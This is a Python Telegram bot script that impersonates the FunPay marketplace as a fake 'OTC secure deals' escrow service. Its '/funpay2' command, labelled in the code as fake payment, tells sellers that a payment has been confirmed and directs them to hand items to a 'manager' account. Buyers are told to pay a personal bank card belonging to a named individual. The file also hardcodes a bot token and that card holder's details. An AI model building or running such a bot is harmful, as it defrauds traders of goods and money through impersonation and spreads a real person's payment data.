import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# Данные бота
bot = Bot(token="8531227508:AAH0hraNjR-yS7_NHj4T29osDXgiqshYO38")
dp = Dispatcher()

# Хранение данных
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
ADMIN_ID = 7634507602  
MANAGER_CARD = "2204 1201 3279 4013 - Маркин Ярослав"
BANNER_URL = "https://s4.iimage.su/s/08/ge2Mdk3xsEJWX46gzz9mR2PtIurOfg5mz6VqTiJ1.jpg"
SUPPORT_USERNAME = "@FunPaySupportOTC"

banned_users = set()
admin_states = {}

# --- Утилиты ---
def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# --- Клавиатуры (RU) ---
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/FunPayOTCdbot")],
    [InlineKeyboardButton(text="Наш сайт", url="https://funpay.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

# --- Клавиатуры (EN) ---
main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/FunPaySupportOTC")]
])

# --- Клавиатуры сделок ---
buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Item sent", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

# --- Логика меню ---
async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    text = "🎁 <b>FunPay OTC | Безопасные сделки</b>" if lang == "ru" else "🎁 <b>FunPay OTC | Secure Deals</b>"
    
    try:
        if message_id: await bot.delete_message(chat_id, message_id)
    except: pass
    
    await bot.send_photo(chat_id=chat_id, photo=BANNER_URL, caption=text, reply_markup=keyboard, parse_mode=ParseMode.HTML)

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try:
        await callback.message.edit_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    except:
        await callback.message.answer(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

# --- Команды ---
@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users: return

    args = message.text.split()
    if len(args) > 1 and args[1].startswith('deal_'):
        deal_id = args[1].replace('deal_', '')
        if deal_id in active_deals:
            deal = active_deals[deal_id]
            if deal["buyer_id"] is None:
                deal["buyer_id"] = user_id
                deal["buyer_username"] = message.from_user.username or "User"
                deal["status"] = "active"
                
                await message.answer(
                    f"🎁 <b>Сделка #{deal_id}</b>\n\n"
                    f"📌 Продавец: @{deal['seller_username']}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"💳 Реквизиты для оплаты:\n<code>{MANAGER_CARD}</code>",
                    reply_markup=buyer_deal_keyboard, parse_mode=ParseMode.HTML
                )
                return

    lang = user_languages.get(user_id, "ru")
    await message.answer("<b>🎁 Добро пожаловать в Funpay OTC!</b>\n\nСогласны с правилами?", reply_markup=start_keyboard_ru, parse_mode=ParseMode.HTML)

@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    # Доступно всем, кто не в бане
    if message.from_user.id in banned_users: return
        
    await message.answer(
        "<b>📋 Правила работы через FunPay OTC</b>\n\n"
        "1. Работа только через менеджера.\n"
        "2. Прямые переводы мимо кассы - БАН.\n"
        "📞 <b>Поддержка:</b> @FunPaySupportOTC",
        reply_markup=sierrateam_keyboard,
        parse_mode=ParseMode.HTML
    )

@dp.message(Command("funpay2"))
async def funpay2_command(message: Message):
    """Фейковая оплата для активной сделки"""
    user_id = message.from_user.id
    found = False
    
    for deal_id, deal in active_deals.items():
        if deal["buyer_id"] == user_id and deal["status"] == "active":
            found = True
            deal["status"] = "payment_confirmed"
            
            # Сообщение покупателю
            await message.answer("✅ <b>Оплата получена!</b> Система зачислила средства на удержание.", parse_mode=ParseMode.HTML)
            
            # Сообщение продавцу
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            msg = (f"✅ <b>Оплата подтверждена!</b>\n\nСделка #{deal_id}\n"
                   f"Отправьте товар менеджеру {SUPPORT_USERNAME} и нажмите кнопку:")
            await bot.send_message(deal["seller_id"], msg, reply_markup=seller_gift_keyboard, parse_mode=ParseMode.HTML)
            break
            
    if not found:
        await message.answer("❌ У вас нет активных сделок в статусе ожидания оплаты.")

# --- Обработка Callbacks ---
@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    user_agreements[callback.from_user.id] = True
    await safe_edit_message(callback, "🎉 <b>Вы успешно зарегистрированы!</b>", welcome_keyboard_ru)

@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    await send_main_menu(callback.message.chat.id, "ru", callback.message.message_id)

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    await safe_edit_message(callback, "🛡️ <b>Создать сделку</b>\n\nВыберите тип:", deal_type_keyboard_ru)

@dp.callback_query(F.data == "deal_gift")
async def deal_gift_callback(callback: CallbackQuery):
    user_deals[callback.from_user.id] = {"step": "description", "type": "gift"}
    await safe_edit_message(callback, "📝 Введите описание товара или ссылку:")

@dp.callback_query(F.data.startswith("currency_"))
async def currency_callback(callback: CallbackQuery):
    curr = callback.data.split("_")[1]
    user_deals[callback.from_user.id]["currency"] = curr
    user_deals[callback.from_user.id]["step"] = "amount"
    await safe_edit_message(callback, f"💰 Введите сумму в {curr}:")

@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    await callback.answer("⏳ Ожидание подтверждения транзакции сетью...", show_alert=True)

@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    for deal_id, deal in active_deals.items():
        if deal["seller_id"] == user_id and deal["status"] == "payment_confirmed":
            deal["status"] = "item_sent"
            await bot.send_message(deal["buyer_id"], "🔔 Продавец отправил товар! Подтвердите получение:", reply_markup=buyer_confirmation_keyboard)
            await safe_edit_message(callback, "✅ Вы подтвердили отправку. Ожидаем покупателя.")
            break

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    for deal_id, deal in active_deals.items():
        if deal["buyer_id"] == user_id:
            await safe_edit_message(callback, "🎉 Сделка завершена!")
            await bot.send_message(deal["seller_id"], "🎉 Покупатель подтвердил получение! Деньги зачислены на баланс.")
            del active_deals[deal_id]
            break

# --- Обработка текста ---
@dp.message(F.text)
async def text_handler(message: Message):
    user_id = message.from_user.id
    if user_id in user_deals:
        data = user_deals[user_id]
        
        if data["step"] == "description":
            data["description"] = message.text
            data["step"] = "currency"
            await message.answer("Выберите валюту:", reply_markup=currency_keyboard_ru)
            
        elif data["step"] == "amount":
            try:
                amount = float(message.text)
                deal_id = generate_deal_id()
                active_deals[deal_id] = {
                    "seller_id": user_id,
                    "seller_username": message.from_user.username or "Seller",
                    "description": data["description"],
                    "currency": data["currency"],
                    "amount": amount,
                    "buyer_id": None,
                    "status": "created"
                }
                bot_info = await bot.get_me()
                link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
                await message.answer(f"✅ <b>Сделка создана!</b>\n\nСсылка для покупателя:\n<code>{link}</code>", parse_mode=ParseMode.HTML)
                del user_deals[user_id]
            except:
                await message.answer("❌ Введите число!")

# Запуск
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())